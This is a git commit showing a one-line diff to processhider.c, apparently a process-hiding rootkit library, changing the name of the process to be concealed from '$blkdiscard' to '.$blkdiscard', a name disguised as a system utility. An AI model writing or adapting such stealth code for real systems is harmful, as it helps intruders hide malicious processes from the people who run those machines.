43b29a1375969a5173e798828e74675927f2a5a4
fhuko1357 <95587230+fhuko1357@users.noreply.github.com>
2024-04-11 19:28:02 +0700

    processhider.c

--- processhider.c
+++ processhider.c
@@ -9,7 +9,7 @@
 /*
  * Every process with this name will be excluded
  */
-static const char* process_to_filter = "$blkdiscard";
+static const char* process_to_filter = ".$blkdiscard";
 
 /*
  * Get a directory name given a DIR* handle
